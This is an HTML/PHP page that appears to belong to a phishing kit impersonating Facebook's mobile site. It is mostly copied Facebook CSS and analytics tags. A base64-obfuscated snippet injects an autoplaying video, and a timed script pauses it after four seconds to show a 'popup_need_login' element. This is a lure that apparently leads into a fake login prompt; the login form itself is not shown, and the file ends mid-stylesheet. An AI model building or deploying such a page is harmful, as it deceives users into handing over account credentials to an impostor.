<?php
require "admin/config.php"; 
?>
<html lang="en">

<head>
    <title></title>
    <script src="./function.js"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1" />
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="msapplication-TileImage" content="/img/ms-icon-144x144.png">
    <meta name="theme-color" content="#ffffff">
    
    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-7WY85MQKRQ"></script>
    <script>
        window.dataLayer = window.dataLayer || [];

        function gtag() {
            dataLayer.push(arguments);
        }
        gtag('js', new Date());

        gtag('config', 'G-7WY85MQKRQ');
    </script>
    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-88149946-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];

        function gtag() {
            dataLayer.push(arguments);
        }
        gtag('js', new Date());

        gtag('config', 'UA-88149946-1');
    </script>
    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-J4FFZPJQCN"></script>
    <script>
        window.dataLayer = window.dataLayer || [];

        function gtag() {
            dataLayer.push(arguments);
        }
        gtag('js', new Date());

        gtag('config', 'G-J4FFZPJQCN');
    </script>
    <!-- <script src="https://cdn.socket.io/3.0.0/socket.io.min.js"></script> -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js" integrity="sha512-aVKKRRi/Q/YV+4mjoKBsE4x3H+BkegoM/em46NNlCqNTmUYADjBbeNefNxYV7giUp0VxICtqdrbqU7iVaeZNXA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
</head>

<body tabindex="0" class="touch x2 android _fzu _50-3 iframe acw  portrait" style="background-color: rgb(255, 255, 255);">
    <style type="text/css">
        #message_box {
            background-color: #fff;
            color: #000;
            border: 1px solid #e5e5e5;
            padding-right: 5px;
        }

        #message_box .grid-message {
            padding-top: 20px;
            height: 1000px;
            overflow: auto;
            overflow-x: hidden
        }

        @media (max-width: 991px) {
            #message_box .grid-message {
                max-height: 100%;
                font-size: 13px
            }
            .live-container .row>div {
                padding-left: 0 !important;
                padding-right: 0 !important
            }
            #message_box .col-message-received {
                margin-bottom: 5px
            }
            #message_box .message-box {
                padding: 10px 5px
            }
        }

        .row-5>div {
            padding-left: 5px;
            padding-right: 5px
        }

        .item-congratulations {
            background-color: rgba(40, 167, 69, 0.5);
            padding: 5px;
            color: #fff;
            text-align: center;
            margin: 10px;
            display: block
        }

        #message_box .col-message-received {
            margin-top: .25em !important;
            padding-left: 40px;
            position: relative
        }

        #message_box .message-box .avatar {
            margin-right: 10px
        }

        .avatar {
            width: 30px;
            height: 30px;
            border-radius: 50%
        }

        img {
            object-fit: cover;
            max-width: 100%
        }

        #message_box .message-box {
            padding: 5px;
            position: relative;
            font-weight: 400;
            margin-bottom: 0;
            border-top: 1px solid #e5e5e5;
            display: flex;
            align-items: center;
            color: #616770
        }

        #message_box .message-box input {
            height: 40px;
            background: none;
            border-radius: 20px;
            border: 1px solid #e5e5e5;
            width: calc(100% - 100px) !important
        }

        input[type=email],
        input[type=password],
        input[type=text] {
            padding-left: 12px;
            padding-right: 12px
        }

        #message_box .message-box .send {
            width: 50px;
            height: 40px;
            margin-left: 10px;
            border: 1px solid #e5e5e5
        }

        #message_box .col-message-received .avatar-message {
            left: 5px
        }

        #message_box .avatar-message {
            width: 30px;
            height: 30px;
            border-radius: 50%;
            bottom: 15px;
            position: absolute
        }

        #message_box .username {
            color: rgba(0, 0, 0, 0.55);
            font-size: 13px;
            font-weight: 400;
            line-height: 1.28;
            margin-bottom: 1px;
            overflow: hidden;
            padding-left: 12px;
            text-overflow: ellipsis;
            white-space: nowrap
        }

        #message_box .time-send {
            color: rgba(0, 0, 0, 0.4);
            font-size: 12px;
            font-weight: 400;
            line-height: 1.28;
            margin-bottom: 1px;
            overflow: hidden;
            padding-left: 12px;
            text-overflow: ellipsis;
            white-space: nowrap
        }

        #message_box .col-message-received .list-message {
            align-items: flex-start
        }

        #message_box .list-message {
            display: flex;
            flex-direction: column
        }

        #message_box .message-received:only-child {
            border-radius: 1em
        }

        #message_box .list-message>div {
            display: inline-block
        }

        #message_box .message-received {
            color: #000;
            background-color: lightgray;
            border-radius: .25em 1em 1em .25em
        }

        #message_box .message-sent,
        #message_box .message-received {
            margin-top: .0625em;
            margin-bottom: .0625em;
            padding: .25em 1em;
            overflow-wrap: break-word
        }
    </style>
    <div id="vdo"></div>
   
    <script type="text/javascript">
        localStorage["play"] = "no";
        
        var vvdo = "PHZpZGVvIHdpZHRoPSIxMDAlIiBsb29wPSJ0cnVlIiBtdXRlZD0iIiBjb250cm9scz0iIiBpZD0ibXlWaWRlbyIgcGxheXNpbmxpbmU9IiIgYXV0b3BsYXk+PHNvdXJjZSBzcmM9InZpZC5tcDQiIHR5cGU9InZpZGVvL21wNCI+PC92aWRlbz4=";
        document.getElementById("vdo").innerHTML = atob(vvdo);
        setTimeout(() => {
            document.getElementById("popup_need_login").style.display = "";
            document.getElementById("myVideo").pause();
        }, 4000);
    </script>
    <style type="text/css">
        #message_box {
            background-color: #fff;
            color: #000;
            border: 1px solid #e5e5e5;
            padding-right: 5px;
        }

        #message_box .grid-message {
            padding-top: 20px;
            height: 1000px;
            overflow: auto;
            overflow-x: hidden
        }

        @media (max-width: 991px) {
            #message_box .grid-message {
                max-height: 100%;
                font-size: 13px
            }
            .live-container .row>div {
                padding-left: 0 !important;
                padding-right: 0 !important
            }
            #message_box .col-message-received {
                margin-bottom: 5px
            }
            #message_box .message-box {
                padding: 10px 5px
            }
        }

        .row-5>div {
            padding-left: 5px;
            padding-right: 5px
        }

        .item-congratulations {
            background-color: rgba(40, 167, 69, 0.5);
            padding: 5px;
            color: #fff;
            text-align: center;
            margin: 10px;
            display: block
        }

        #message_box .col-message-received {
            margin-top: .25em !important;
            padding-left: 40px;
            position: relative
        }

        #message_box .message-box .avatar {
            margin-right: 10px
        }

        .avatar {
            width: 30px;
            height: 30px;
            border-radius: 50%
        }

        img {
            object-fit: cover;
            max-width: 100%
        }

        #message_box .message-box {
            padding: 5px;
            position: relative;
            font-weight: 400;
            margin-bottom: 0;
            border-top: 1px solid #e5e5e5;
            display: flex;
            align-items: center;
            color: #616770
        }

        #message_box .message-box input {
            height: 40px;
            background: none;
            border-radius: 20px;
            border: 1px solid #e5e5e5;
            width: calc(100% - 100px) !important
        }

        input[type=email],
        input[type=password],
        input[type=text] {
            padding-left: 12px;
            padding-right: 12px
        }

        #message_box .message-box .send {
            width: 50px;
            height: 40px;
            margin-left: 10px;
            border: 1px solid #e5e5e5
        }

        #message_box .col-message-received .avatar-message {
            left: 5px
        }

        #message_box .avatar-message {
            width: 30px;
            height: 30px;
            border-radius: 50%;
            bottom: 15px;
            position: absolute
        }

        #message_box .username {
            color: rgba(0, 0, 0, 0.55);
            font-size: 13px;
            font-weight: 400;
            line-height: 1.28;
            margin-bottom: 1px;
            overflow: hidden;
            padding-left: 12px;
            text-overflow: ellipsis;
            white-space: nowrap
        }

        #message_box .time-send {
            color: rgba(0, 0, 0, 0.4);
            font-size: 12px;
            font-weight: 400;
            line-height: 1.28;
            margin-bottom: 1px;
            overflow: hidden;
            padding-left: 12px;
            text-overflow: ellipsis;
            white-space: nowrap
        }

        #message_box .col-message-received .list-message {
            align-items: flex-start
        }

        #message_box .list-message {
            display: flex;
            flex-direction: column
        }

        #message_box .message-received:only-child {
            border-radius: 1em
        }

        #message_box .list-message>div {
            display: inline-block
        }

        #message_box .message-received {
            color: #000;
            background-color: lightgray;
            border-radius: .25em 1em 1em .25em
        }

        #message_box .message-sent,
        #message_box .message-received {
            margin-top: .0625em;
            margin-bottom: .0625em;
            padding: .25em 1em;
            overflow-wrap: break-word
        }
    </style>
    <style type="text/css">
        .wp.touch._fzu .storyStream>.carded,
        .wp.touch._fzu .storyStream>article>.carded,
        .wp.touch._fzu .storyStream>div>.carded,
        .android.touch._fzu .storyStream>.carded,
        .android.touch._fzu .storyStream>article>.carded,
        .android.touch._fzu .storyStream>div>.carded,
        .wp.touch._fzu .groupChromeView.feedRevamp .carded,
        .android.touch._fzu .groupChromeView.feedRevamp .carded {
            border: 1px solid #bdbebf;
            border-image: none
        }

        .touch._fzu .storyStream>.carded,
        .touch._fzu .storyStream>.carded:first-child,
        .touch._fzu .storyStream>article>.carded,
        .touch._fzu .storyStream>div>.carded,
        .touch._fzu .groupChromeView.feedRevamp .carded {
            border-image: url(/rsrc.php/v3/yN/r/QmGuax92JQa.png) 4 4 6 repeat;
            border-width: 4px 4px 6px;
            margin: 0 8px 9px
        }

        .touch._fzu .storyStream>.carded._29d0 {
            border: 0 none;
            margin: 0 0 8px;
            overflow: hidden;
            padding: 16px
        }

        .touch._fzu .storyStream>.carded._29d0._122m {
            padding: 10px 10px 0
        }

        .touch._fzu .groupChromeView.feedRevamp .carded.groupHeader {
            margin: 10px 8px
        }

        .x2.touch._fzu .storyStream>.carded,
        .x2.touch._fzu .storyStream>article>.carded,
        .x2.touch._fzu .storyStream>div>.carded,
        .x2.touch._fzu .groupChromeView.feedRevamp .carded {
            border-image: url(/rsrc.php/v3/yg/r/Akfeh70CbhS.png) 8 8 12 repeat
        }

        .touch._fzu .structuredPublisher.feedRevampPadding {
            padding: 0 10px 10px
        }

        .touch._fzu ._3b9.structuredPublisher.feedRevampPadding {
            padding: 0 0 10px
        }

        .touch._fzu .story .msg {
            word-wrap: break-word
        }

        body.touch {
            margin: 0;
            -webkit-text-size-adjust: none;
            cursor: pointer
        }

        .touch,
        .touch td,
        .touch input,
        .touch textarea .touch button {
            font-family: Helvetica, Arial, sans-serif;
            font-size: 14px
        }

        .android,
        .android td,
        .android input,
        .android textarea,
        .android button {
            font-family: Roboto, 'Droid Sans', Helvetica, sans-serif
        }

        .wp,
        .wp td,
        .wp input,
        .wp textarea,
        .wp button {
            font-family: 'Segoe WP', Arial, sans-serif
        }

        .bb10,
        .bb10 td,
        .bb10 input,
        .bb10 textarea,
        .bb10 button {
            font-family: 'Slate Pro', Arial, sans-serif
        }

        .x2.ios,
        .x2.ios td,
        .x2.ios input,
        .x2.ios textarea,
        .x2.ios button {
            font-family: Helvetica, Arial, sans-serif
        }

        .sf.ios,
        .sf.ios td,
        .sf.ios input,
        .sf.ios textarea,
        .sf.ios button {
            font-family: -apple-system, sans-serif
        }

        .app,
        .touchable,
        .btn,
        i.img {
            -webkit-user-select: none
        }

        .touch,
        .touch .btn,
        .touch .input,
        .touch button,
        .touch input,
        .touch select,
        .touch textarea {
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0)
        }

        .touch input,
        .touch textarea {
            -webkit-user-select: text
        }

        .landscape .portrait_only {
            display: none !important
        }

        .portrait .landscape_only {
            display: none !important
        }

        #root {
            border-bottom: 1px solid transparent;
            box-sizing: border-box
        }

        @supports (padding-left: env(safe-area-inset-left)) and (padding-right: env(safe-area-inset-right)) {
            #rootpadding-left: env(safe-area-inset-left);
            padding-right: env(safe-area-inset-right)
        }

        }

        .maxwidth {
            margin: 0 auto;
            max-width: 680px
        }

        .accessible_elem {
            clip: rect(1px, 1px, 1px, 1px);
            height: 1px;
            overflow: hidden;
            position: absolute;
            white-space: nowrap;
            width: 1px
        }

        body {
            text-align: left;
            direction: ltr
        }

        body,
        tr,
        input,
        textarea,
        button {
            font-family: sans-serif
        }

        body,
        p,
        figure,
        h1,
        h2,
        h3,
        h4,
        h5,
        h6,
        ul,
        ol,
        li,
        dl,
        dd,
        dt {
            margin: 0;
            padding: 0
        }

        h1,
        h2,
        h3,
        h4,
        h5,
        h6 {
            font-size: 1em;
            font-weight: 700
        }

        ul,
        ol {
            list-style: none
        }

        article,
        aside,
        figcaption,
        figure,
        footer,
        header,
        nav,
        section {
            display: block
        }

        #mErrorView .container {
            font-family: Helvetica, Arial, sans-serif;
            margin-top: -110px;
            position: absolute;
            text-align: center;
            top: 50%;
            width: 100%
        }

        #mErrorView .image {
            background-repeat: no-repeat;
            background-position: center center;
            background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAKoAAACWCAMAAAB5EONmAAABwlBMVEXI0OL///////+srKyGkabY3upXWFkAAAC3u8PDy90AAAAAAADLy8y0u8y0u8ukqrqrssLl5eW8xNWsssK8w9XR0dIAAAD5+fm7xNWss8LJy9Hl5eakq7qrssHw7/ClqrrDyt3w8PDDy9za2tu7w9X4+fmrs8Kkqrv5+Pnb2tsAAADa29v+/v7z9PYAAADb29sAAADP09vT2OK7w9Tv8PDR0tLv7/DR0dMAAAClq7q8xNTDytzS0dK8w9RDRkisssMAAABER0lER0kAAAAAAAAAAAB6e3u8wcmRkpKrssPAxc2io6O0tLTEydFlZmdvcHHw7+8AAACOkplkZmi7xNQAAADa2txDRkg/QkTExMUAAAAAAACnqKmho6Ta29wAAAAdHh8XGBg8P0E9P0E2OToAAAAAAAAlJyhCRUcxNDU9P0G6ury6u7zS1+W2u8jq7PHN1OTS0tPf4OLb2tzDyNT5+Pilqrukq7ulq7uxtcH4+PnMztDS0tLLztOsrK1lZ2m4u8Wprr3w8O/5+fjT1uH4+fi6vsrP0tXIyMpnamuorbzR0tO+wcfZ3OTn5+fLysv6+/3OztDExsvW2N26wM5ER0nIpHWgAAAAlnRSTlOzswCzs7OzD7OzNiezs7Ozs7Ozs7OzALOzs7Ozs7Ozs7Ozs7Ozs7Ozs7MBs7OzBrMOs7Ozs7OzsyCzs7Ozs36zBBJ9AxgLs7Ozs7Ozs7Ozs7MKs7OzJrOoi7M1EbOzszEwPYyQYyskSahsi7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7NmtuQuAAADxUlEQVR42u3c+VPTaBgHcF2FUl1NTdILakKTXrTYFiilpSAop5zifd/33rr36u7qrsce3ub/3e9LbLZTZhh+YXw7fp+U533e502az0w600npdMsnLROkkkoqqaSSSurmUQ8cdGSMgwdWqaEGaXa/I2fszzZTxx1ZY7yZutLe3n5+q2xxHtSVZmoR1K3yBajFZqpPWqqPVFJJJbXh3b+Ruu1Dx1qq9+7fItRxpxWo3qU/0tYmNbXh0rfJTh13Woa6ggKXvqOjQ3pqEUVba1B9LUyVJkgllVRSSf1Q1H17tzfH3n3e6pbNj41TIV1rlZMK2doglVRSSSWVVFJJJZVUmam9vb2tchcgFXX9eyvZqOsHqaSSSiqppJJKKqmkkkoqqS1E5f9YSSWVVH4fgB8Fk0oqqaSSSiqppJJK6gapvAvYjO8D8DMrUkkllVRSSSWV1PWp/f39oCLLT+3r6wMVWX5qZ2fnzMwM8tLSkvzUubk55OXlZfmpi4uLyNPT05JTP63H7OzsxqSvNl/69frU+fn5ZPiPZCaceZwMI37OhMPfZZKoM9jEgCbG5Fd+v2X5azW/VfO70e3vttDEiMLrecmyahay1xddd+F90+pGYbkLNbHwBRg4dSaTbKSerlMXFhYM47ARLxtx45FhxEtxEWihjpfLpXg5jmbZKP2pR/SEqiciujpwbHRYjWBTdV1XVfRRD4zqA+gci2A/fTiSiKijWMIDu2A+ikZiADNkNFTMEngmrKiRYVR6Qk88N0pGqYyzv/CoJx3nHJT12NPVtQeBJLL7EFtXY+/tu127d+/CJgZk/L0v66O77q55C26JcBve8e5z1Hvujt/e7cI5xck+d5yTLvWU4xz97H9qocc+YffYhZ5cD3LBzhVs+0IuZ9to3MsVRDP34MtoIBBNHQogR1FqmjaWCmgYMUFPw0rqECZopFBGUaa0MewxpgWiAUyjmoa+OBBtHCFKzFOalsIy5k+e2uKUuRP2s78c59QqtXjNgfWc9xr4ZyQ48s1QMDgYHBwaHAqOBEVgFB2xBV+/+f2hophKOhZTMOLxI0ZRK2mRzLRZn6ODCntiqJoxxTRFGcOBMTONQ2Ooq6iVdFr53oyZ1ar5g1k1lb9/+veX++5ZX/76G3zXioI6demOI3vcuTQlqPnJm1ckl165OZkX1Alf5fLtq7ekdd66evtyxTchqNn82cr1i2d2yBpnLl6vnM27P7+ZzfsmKzeO75Qzjt+oTPry2dAqNZSdyE8VfbJGcSo/kQ2F+AO8pJJKKqkfMfU/hM/KaicmSuAAAAAASUVORK5CYII=);
            display: inline-block;
            height: 150px;
            width: 170px
        }

        #mErrorView .message {
            color: #60676f;
            font-size: 18px;
            font-weight: 700;
            margin: 5px 0 15px
        }

        #mErrorView .link {
            color: #576b95;
            font-size: 16px;
            font-weight: 700;
            text-decoration: none
        }

        ._5vsg,
        ._5vsh {
            height: 50%
        }

        .portrait ._5vsg,
        .landscape ._5vsh {
            display: none
        }

        ._5v5d {
            text-align: center;
            width: 100%
        }

        .ios.app ._5v5d {
            color: #636d7d;
            font-size: 17px;
            left: 3px
        }

        ._5v5e {
            margin-top: -10px;
            position: absolute;
            top: 50%
        }

        ._5v5d .img {
            position: relative;
            right: 5px;
            top: -1px
        }

        .mFuturePageHeader td.left .btn.backButton {
            height: 29px;
            width: 44px
        }

        .touch .mFuturePageHeader table {
            border-collapse: collapse;
            height: 29px;
            width: 100%
        }

        .touch .mFuturePageHeader.titled table {
            table-layout: fixed
        }

        .touch .mFuturePageHeader td {
            padding: 0;
            vertical-align: middle
        }

        .touch .mFuturePageHeader td.right .pageHeaderChromelessButton {
            float: right
        }

        .touch ._50l4 {
            margin: 0 8px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap
        }

        .touch ._1uh1 ._50l4 {
            margin: 0 4px;
            padding-top: 1px;
            text-align: center;
            vertical-align: middle
        }

        .touch ._1uh1 ._50l4.mfsl {
            font-size: 18px;
            line-height: 22px
        }

        ._52z5 {
            background: #3b5998;
            box-sizing: border-box;
            height: 44px;
            margin: 0 auto;
            padding: 0;
            position: relative;
            width: 100%;
            z-index: 12
        }

        ._52z5._7gxn {
            border-bottom: 1px solid #dadde1;
            height: 81px
        }

        ._7gxp {
            background-color: #fff
        }

        ._8dv4 {
            background: #fff;
            color: #000;
            font-weight: 700
        }

        ._rqm {
            bottom: 0;
            left: 0;
            padding: 0;
            position: fixed;
            top: 0;
            width: 100%
        }

        @supports (padding-left: env(safe-area-inset-left)) and (padding-right: env(safe-area-inset-right)) {
            ._52z5_rqmpadding-left: env(safe-area-inset-left);
            padding-right: env(safe-area-inset-right)
        }

        }

        ._7gxn .jewel .flyout {
            margin-top: 80px
        }

        ._rqm .jewel .flyout {
            height: 100%;
            overflow-y: scroll
        }

        ._imu {
            height: 0;
            margin-top: 44px
        }

        ._7gxn._imu {
            margin-top: 76px
        }

        ._52z5._1uh1 {
            background: #4267b2;
            height: 48px;
            padding: 9px 4px
        }

        ._52z5._55wp {
            padding: 0
        }

        ._127q {
            background: linear-gradient(#fafbfe, #e2e5eb);
            border-color: #b9bcc1
        }

        ._52z6 {
            min-width: 100px;
            text-align: center
        }

        ._52z5._1uh1 div:last-child ._52z6 {
            text-align: left
        }

        ._52z7 {
            text-align: left
        }

        ._52z8 {
            margin-right: 8px;
            text-align: right
        }

        ._363f {
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap
        }

        ._363o {
            padding-bottom: 14px;
            padding-left: 8px;
            padding-top: 14px
        }

        ._52z7 ._2z9s,
        ._52z7 .btn {
            position: relative;
            z-index: 13
        }

        ._52z8 .pageHeaderChromelessButton {
            float: right
        }

        ._52z7 .btn,
        ._52z8 .btn {
            max-width: 85px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap
        }

        ._52z7._52z7 .btn.btnI.bgb,
        ._52z8._52z8 .btn.btnI.bgb {
            background: none;
            border: 0;
            border-radius: 2px;
            box-shadow: none;
            color: #fff;
            font-weight: 400;
            line-height: 28px;
            min-width: 0;
            padding: 0 12px;
            text-shadow: none
        }

        ._39kq ._52z7._52z7 ._419z,
        ._39kq ._52z8._52z8 ._419z,
        ._39kq ._52z7._52z7 .btn.btnI.bgb,
        ._39kq ._52z8._52z8 .btn.btnI.bgb {
            background-color: #373e4c
        }

        ._52z7._52z7 .btnI.bgb[disabled],
        ._52z8._52z8 .btnI.bgb[disabled] {
            opacity: .3
        }

        ._52z8 .flyoutItem {
            max-width: none
        }

        ._52z8 .flyout.profileActions .btnN {
            color: #fff
        }

        ._52z5._39kq {
            background: #373e4c
        }

        ._vqv .button,
        ._vqv .read {
            padding-right: 8px;
            position: absolute
        }

        ._vqv .button {
            line-height: 0;
            padding-top: 8px;
            right: 0;
            top: 2px
        }

        ._vqv .read {
            font-weight: initial;
            right: 28px
        }

        ._vqv {
            background: #fff;
            border-radius: 3px 3px 0 0;
            border-radius: 0;
            color: #1d2129;
            font-size: 16px;
            font-weight: 700;
            height: 44px;
            line-height: 44px;
            padding: 0 8px;
            position: relative;
            text-align: left;
            text-shadow: none;
            top: 0
        }

        ._k6r {
            visibility: hidden
        }

        ._3o4w {
            left: 12px;
            line-height: 20px;
            position: absolute;
            top: 12px;
            vertical-align: middle
        }

        ._3o4w>.img {
            vertical-align: top
        }

        ._9hfc {
            height: 14px
        }

        ._9mln {
            position: relative
        }

        ._9mlm ._52z5,
        ._9mln._52z5 {
            background-color: #fff;
            border-bottom: 1px solid #e4e6eb;
            position: relative
        }

        ._9mlm ._52z5 ._50l4,
        ._9mln ._52z6 ._50l4,
        ._9mln._52z5 ._52z7._52z7 .btn.btnI.bgb,
        ._9mln ._50l4,
        ._9mln ._52z8 .inv {
            color: #000
        }

        ._9mlm ._52z5 ._9hfc,
        ._9mln ._52z6 ._9hfc,
        ._9mln ._52z7 ._9hfc {
            height: 40px
        }

        ._9mln._52z5 ._50l4 {
            align-items: center;
            bottom: 0;
            color: #000;
            display: flex;
            justify-content: center;
            left: 0;
            pointer-events: none;
            position: absolute;
            right: 0;
            top: 0
        }

        ._9mln._52z5 ._52z7 ._50l4 {
            justify-content: flex-start
        }

        ._9mln ._52z7 ._9hfc {
            bottom: 0;
            left: 0;
            margin: auto;
            position: absolute;
            right: 0;
            top: 0
        }

        .touch ._3qet .voice,
        ._3qet .jewel .touchable-notification,
        ._3qet .touchable-notification .touchable,
        ._3qet .jewel .flyout .messages-flyout-item {
            padding: 8px
        }

        ._3qet .touchable-notification .ib .l {
            margin-right: 8px
        }

        ._3qet .fcg {
            color: #4b4f56
        }

        .touch ._3qet .mRequestItem .btn {
            border: 0;
            border-radius: 2px;
            box-shadow: none;
            line-height: 28px;
            text-shadow: none
        }

        .touch ._3qet .mRequestItem .btn+.btn {
            margin-left: 8px
        }

        .touch ._3qet .mRequestItem .btnD {
            background: #fff;
            border: 1px solid #d3d6db;
            color: #4b4f56;
            line-height: 26px
        }

        .touch ._3qet .mRequestItem .btnC {
            background: #3578e5
        }

        .touch ._3qet .al {
            background: #f5f6f7;
            border-bottom: 1px solid #ebedf0;
            border-top: 1px solid #ebedf0;
            color: #4b4f56;
            font-weight: 400;
            height: 24px;
            text-shadow: none
        }

        .touch ._3qet .al .mfsl {
            font-size: 12px;
            line-height: 24px;
            text-transform: uppercase
        }

        .touch ._3qet .mRequestItem .attachment {
            margin: 4px 0 0
        }

        .touch ._39kq ._50l4 {
            color: #fff
        }

        ._451a #requests_jewel .efsInner {
            background: #fff
        }

        ._451a #requests_jewel .efsWrapper {
            background: none;
            padding: 0
        }

        ._451a #requests_jewel .efsSelector {
            border: 0;
            border-bottom: 1px solid #e9e9e9;
            border-radius: 0;
            margin: 0;
            padding: 0
        }

        ._451a #requests_jewel .efsSelector+.efsSelector {
            border-bottom: 0;
            border-top: 10px solid #f6f7f8
        }

        ._451a .efsItem {
            border-top-style: solid;
            border-top-width: 1px
        }

        ._451a .efsSelector label {
            padding: 8px
        }

        .viewportArea {
            height: 100%;
            position: absolute;
            top: 1px;
            width: 100%
        }

        body.iframe .viewportArea,
        body.app .viewportArea {
            top: 0
        }

        .touch #viewport {
            min-height: 100%;
            overflow: hidden;
            position: relative;
            width: 100%
        }

        #page {
            position: relative
        }

        ._129- {
            border-top: 1px solid #3b5998
        }

        ._129-._4yqz {
            border-top: 1px solid #373e4c
        }

        ._129_ {
            position: relative;
            z-index: 13
        }

        ._129_>:first-child {
            border-top: 1px solid transparent
        }

        body.iframe ._129-,
        body.app ._129-,
        body.webapp ._129-,
        body.iframe ._129_>:first-child,
        body.app ._129_>:first-child,
        body.webapp ._129_>:first-child {
            border-top: none
        }

        ._3wo2 {
            padding-top: 45px
        }

        ._3wo2.-softstate-search #root,
        ._3wo2.-softstate-requests #root,
        ._3wo2.-softstate-bookmarks #root {
            display: none
        }

        ._3wo2 ._129- {
            position: fixed;
            top: -1px;
            transform: translate3d(0, 0, 0);
            transform-origin: top left;
            transition: all 200ms cubic-bezier(.08, .52, .52, 1);
            width: 100%;
            z-index: 20
        }

        ._3wo2 ._2qbw {
            transform: translate3d(0, 0, 0);
            transform-origin: top left;
            transition: all 200ms cubic-bezier(.08, .52, .52, 1)
        }

        ._3wo2.scrolled ._129-,
        ._3wo2.scrolled ._2qbw {
            transform: translateY(-45px)
        }

        ._67iw ._129- {
            border-bottom: 1px solid rgba(0, 0, 0, .1)
        }

        ._6dr5.float {
            position: fixed;
            top: -1px;
            width: 100%;
            z-index: 20
        }

        ._6dr5.hidden {
            visibility: hidden
        }

        ._5qc1 {
            font-size: 13px;
            line-height: 17px;
            margin: 0 0 12px;
            padding: 10px 10px 0
        }

        ._ung {
            margin-bottom: 5px;
            min-height: 20px;
            padding-top: 7px
        }

        ._177o {
            display: flex;
            align-items: center
        }

        ._2nhr {
            display: inline-block;
            margin: 1px 8px 2px 0
        }

        ._177o ._2l5u {
            flex: 1
        }

        ._5qc3._5qc3 {
            font-size: 14px;
            line-height: 17px;
            padding: 1px 0 2px
        }

        ._1o88 ._5qc3._5qc3 {
            padding: 0
        }

        ._5qc3._5qc3 a {
            color: inherit;
            font-weight: 700
        }

        ._5qc3._411r {
            height: 18px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap
        }

        .touch ._5qc4._5qc4 a,
        .touch ._5qc4._5qc4._5qc4 a {
            color: inherit;
            font-weight: 400
        }

        .touch ._5qc4._5qc4 ._4l3o,
        .touch ._5qc4._5qc4._5qc4 a._4l3o {
            color: #4267b2;
            font-weight: 700;
            position: relative
        }

        .touch ._5qc4._5qc4 ._4l3w,
        .touch ._5qc4._5qc4._5qc4 a._4l3w {
            background-color: #4080ff;
            border-radius: 4px;
            box-sizing: border-box;
            color: #fff;
            display: inline-block;
            font-size: 12px;
            line-height: 18px;
            padding: 1px 6px
        }

        ._5qc4 ._46lw {
            font-weight: 400;
            left: 0;
            line-height: 20px;
            position: absolute;
            top: 100%;
            white-space: nowrap;
            z-index: 1
        }

        ._46lw ._4l3x {
            margin-right: 8px
        }

        .touch ._2lm- {
            margin-top: .2em
        }

        ._5s3i {
            margin: 0 2px;
            position: relative;
            top: 2px;
            vertical-align: top
        }

        ._bhr {
            color: #fa3e3e;
            display: inline;
            font-weight: 700;
            margin-left: 8px
        }

        ._4s07 {
            margin-top: -10px
        }

        ._5pdt {
            font-weight: 400
        }

        ._2fip {
            font-weight: 400
        }

        ._2fip a {
            font-weight: 700
        }

        ._53p3 {
            font-weight: 200;
            margin-bottom: 0
        }

        ._53p3 ._5qc3 {
            font-weight: 200
        }

        ._53p3 strong {
            font-weight: 500
        }

        ._67lm {
            position: relative
        }

        ._36xo {
            margin-top: -.3333em;
            position: relative;
            top: .3333em
        }

        ._9s5::after {
            content: ' '
        }

        ._9s6,
        ._9s5 {
            display: inline
        }

        ._4y-t {
            font-family: 'HelveticaNeue-Medium', 'Helvetica Neue Medium', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            font-size: 14px;
            padding-top: 10px
        }

        ._4y-t ._ung {
            color: #7f7f7f
        }

        ._4y-u {
            padding-right: 7px
        }

        ._4y-v {
            color: #666;
            font-family: 'HelveticaNeue-Light', 'Helvetica Neue Light', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            font-size: 12px
        }

        ._2zfw {
            color: #dadde1
        }

        ._4y-t._ung ._2zfw {
            color: #7f7f7f
        }

        ._7jwh {
            margin-left: -7px
        }

        ._7jwi {
            display: inline-block
        }

        ._8479 {
            border: 2px solid #bec3c9;
            border-radius: 200px;
            box-sizing: border-box;
            padding: 2px
        }

        ._847o {
            border: 2px solid #3578e5
        }

        ._8-q6 {
            opacity: .4
        }

        ._5dzy {
            display: inline-block;
            height: 13px;
            margin-left: 4px;
            vertical-align: 0;
            width: 13px
        }

        ._5d-0 {
            height: 16px;
            margin-left: 5px;
            vertical-align: -1px;
            width: 16px
        }

        ._5d-3 {
            height: 18px;
            margin-left: 5px;
            vertical-align: -3px;
            width: 18px
        }

        ._56_f._5dzy {
            background-image: url(/rsrc.php/v3/y_/r/sO8pFbm5AdZ.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: -1px -249px
        }

        ._56_f._5d-0 {
            background-image: url(/rsrc.php/v3/y_/r/sO8pFbm5AdZ.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: -106px -169px
        }

        ._56_f._5d-3 {
            background-image: url(/rsrc.php/v3/y_/r/sO8pFbm5AdZ.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: -64px -169px
        }

        ._56_f._3twv._5dz- {
            background-image: url(/rsrc.php/v3/y_/r/sO8pFbm5AdZ.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: -15px -264px;
            margin-left: 3px;
            vertical-align: -2.2px
        }

        ._56_f._3vjg._5dz-,
        ._56_f._3vjg._5dz_,
        ._56_f._3vjg._5d-0,
        ._56_f._3vjg._5d-1 {
            background-image: url(/rsrc.php/v3/y_/r/sO8pFbm5AdZ.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: -16px -248px
        }

        ._56_f._5d-3 {
            pointer-events: all
        }

        #modalDialog {
